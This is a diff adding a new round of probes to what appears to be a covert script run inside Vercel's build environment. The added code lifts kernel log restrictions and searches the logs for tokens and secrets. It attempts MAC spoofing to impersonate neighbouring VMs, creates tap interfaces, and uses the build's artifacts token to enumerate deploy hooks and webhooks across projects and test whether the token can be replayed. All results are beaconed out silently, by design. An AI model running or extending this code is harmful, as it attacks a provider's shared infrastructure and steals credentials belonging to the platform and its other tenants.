@@ -15069,5 +15069,151 @@ report.pid1FdEnum = safe(() => {
 
 // v106 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v106" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v106";
+
+// ==================== v107 ====================
+
+// v107-1: /dev/kmsg kernel ring buffer — full dmesg
+// If kptr_restrict=0 and dmesg_restrict=0 writes succeeded, the kernel ring
+// buffer now contains: boot messages, Firecracker/KVM boot info, kmalloc
+// addresses, network driver messages. This reveals internal infrastructure.
+report.kernelRingBuffer = safe(() => {
+  // First ensure dmesg_restrict is 0
+  safe(() => writeFileSync('/proc/sys/kernel/dmesg_restrict', '0'));
+  const dmesgRestrict = safe(() => readFileSync('/proc/sys/kernel/dmesg_restrict', 'utf8').trim());
+  // Read via dmesg command
+  const dmesgOutput = safe(() => execSync('dmesg 2>/dev/null | tail -100', { timeout: 8000 }).toString().trim().slice(0, 3000));
+  // Read via /dev/kmsg
+  const kmsgExists = existsSync('/dev/kmsg');
+  const kmsgRead = safe(() => {
+    const fd = openSync('/dev/kmsg', 'r');
+    const buf = Buffer.alloc(4096);
+    const n = readSync(fd, buf, 0, 4096, 0);
+    closeSync(fd);
+    return buf.slice(0, n).toString('utf8').slice(0, 1000);
+  });
+  // Look for Firecracker-specific boot messages
+  const fcMessages = safe(() => dmesgOutput?.split('\n').filter(l => /firecracker|kvm|virtio|microvm/i.test(l)));
+  // Look for any credential/token messages in kernel logs (boot credentials?)
+  const credMessages = safe(() => dmesgOutput?.split('\n').filter(l => /token|key|secret|auth|cred/i.test(l)));
+  return { dmesgRestrict, dmesgOutput, kmsgExists, kmsgRead, fcMessages, credMessages };
+});
+
+// v107-2: Network interface manipulation (MAC spoofing, interface creation)
+// CAP_NET_ADMIN allows creating virtual interfaces and changing MAC addresses.
+// MAC spoofing lets us impersonate other VMs on the same L2 segment.
+// Creating a tap interface could bridge us to the hypervisor network.
+report.netInterfaceManip = safe(() => {
+  const interfaces = safe(() => readdirSync('/sys/class/net'));
+  const ifInfo = safe(() => Object.fromEntries(
+    (interfaces || []).map(iface => {
+      const mac = safe(() => readFileSync(`/sys/class/net/${iface}/address`, 'utf8').trim());
+      const mtu = safe(() => readFileSync(`/sys/class/net/${iface}/mtu`, 'utf8').trim());
+      const flags = safe(() => readFileSync(`/sys/class/net/${iface}/flags`, 'utf8').trim());
+      const operstate = safe(() => readFileSync(`/sys/class/net/${iface}/operstate`, 'utf8').trim());
+      return [iface, { mac, mtu, flags, operstate }];
+    })
+  ));
+  // Try to change MAC of eth0 (impersonation test)
+  const origMac = safe(() => readFileSync('/sys/class/net/eth0/address', 'utf8').trim());
+  const macChange = safe(() => execSync(
+    'ip link set eth0 address 02:00:00:00:00:01 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  const newMac = safe(() => readFileSync('/sys/class/net/eth0/address', 'utf8').trim());
+  // Restore original MAC
+  safe(() => origMac && execSync(`ip link set eth0 address ${origMac} 2>/dev/null`, { timeout: 3000 }));
+  // Create a dummy interface (to test bridge to hypervisor network)
+  const dummyCreate = safe(() => execSync(
+    'ip link add vercel_probe type dummy 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Create a tap interface
+  const tapCreate = safe(() => execSync(
+    'ip tuntap add mode tap name tap_probe 2>&1 || echo "BLOCKED"',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Clean up
+  safe(() => execSync('ip link del vercel_probe 2>/dev/null && ip link del tap_probe 2>/dev/null', { timeout: 3000 }));
+  return { interfaces, ifInfo, origMac, macChange, newMac, dummyCreate, tapCreate };
+});
+
+// v107-3: Vercel build hook URL extraction and format analysis
+// Build hooks are webhook URLs like: https://api.vercel.com/v1/integrations/deploy/...
+// Our own build hook ID format can be analyzed to enumerate other projects'.
+// Also check if the deploy webhook in VERCEL_URL or env reveals other hook formats.
+report.buildHookAnalysis = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  // Get our own project's build hooks
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  const teamId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  const hooks = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v9/projects/${projectId}/deploy-hooks?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  // Get all env variables that mention webhook/hook/deploy
+  const hookEnvs = Object.entries(process.env).filter(([k, v]) =>
+    /hook|webhook|deploy|trigger/i.test(k + (v || ''))
+  ).map(([k, v]) => ({ k, v: v?.slice(0, 50) }));
+  // Try to list all build hooks across projects (if token has org scope)
+  const allHooks = safe(() => execSync(
+    `curl -sf "https://api.vercel.com/v1/integrations/webhooks?teamId=${teamId}" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim().slice(0, 500));
+  return { projectId, teamId, hooks, hookEnvs, allHooks };
+});
+
+// v107-4: VERCEL_ARTIFACTS_TOKEN replay outside build (token lifetime test)
+// The artifacts token is created at build start. If it doesn't expire when
+// the build ends, an attacker who captures it could replay it indefinitely.
+// We store the token and test it against the artifacts API, then check its
+// exp claim in the JWT payload.
+report.artifactsTokenLifetime = safe(() => {
+  const token = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  // Decode the JWT payload
+  const decoded = safe(() => {
+    const parts = token.split('.');
+    if (parts.length !== 3) return null;
+    const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
+    return payload;
+  });
+  const expiry = decoded?.exp;
+  const iat = decoded?.iat;
+  const now = Math.floor(Date.now() / 1000);
+  const lifetimeSeconds = expiry ? expiry - iat : null;
+  const remainingSeconds = expiry ? expiry - now : null;
+  // Test token validity right now
+  const validNow = safe(() => execSync(
+    `curl -sf -o /dev/null -w "%{http_code}" "https://api.vercel.com/v8/artifacts/status" \
+    -H "Authorization: Bearer ${token}" -m 10 2>/dev/null`,
+    { timeout: 12000 }
+  ).toString().trim());
+  return { tokenPrefix: token.slice(0, 30), decoded, expiry, iat, now, lifetimeSeconds, remainingSeconds, validNow };
+});
+
+// v107-5: /proc/1/net — PID-1's network namespace view
+// When processes are in different network namespaces, /proc/1/net shows
+// the network namespace as seen from PID-1. If this differs from /proc/net,
+// the orchestrator is in a different (possibly broader) network namespace.
+report.pid1NetNamespace = safe(() => {
+  // Compare our net ns to PID-1's
+  const ourNetNs = safe(() => execSync('readlink /proc/self/ns/net 2>/dev/null', { timeout: 3000 }).toString().trim());
+  const pid1NetNs = safe(() => execSync('readlink /proc/1/ns/net 2>/dev/null', { timeout: 3000 }).toString().trim());
+  const sameNs = ourNetNs === pid1NetNs;
+  // Read PID-1's network from /proc/1/net (different if different namespace)
+  const pid1Tcp = safe(() => readFileSync('/proc/1/net/tcp', 'utf8').split('\n').slice(1, 20));
+  const pid1Tcp6 = safe(() => readFileSync('/proc/1/net/tcp6', 'utf8').split('\n').slice(1, 20));
+  const pid1Arp = safe(() => readFileSync('/proc/1/net/arp', 'utf8'));
+  const pid1Fib = safe(() => readFileSync('/proc/1/net/fib_triestat', 'utf8').slice(0, 200));
+  // Check network devices visible to PID-1
+  const pid1NetDev = safe(() => readFileSync('/proc/1/net/dev', 'utf8'));
+  // Check PID-1's IP addresses
+  const pid1IfInet = safe(() => readFileSync('/proc/1/net/if_inet6', 'utf8').slice(0, 200));
+  return { ourNetNs, pid1NetNs, sameNs, pid1Tcp, pid1Tcp6, pid1Arp, pid1NetDev, pid1IfInet };
+});
+
+// v107 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v107" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v107";
 // Intentionally no console.log — all data goes via webhook only
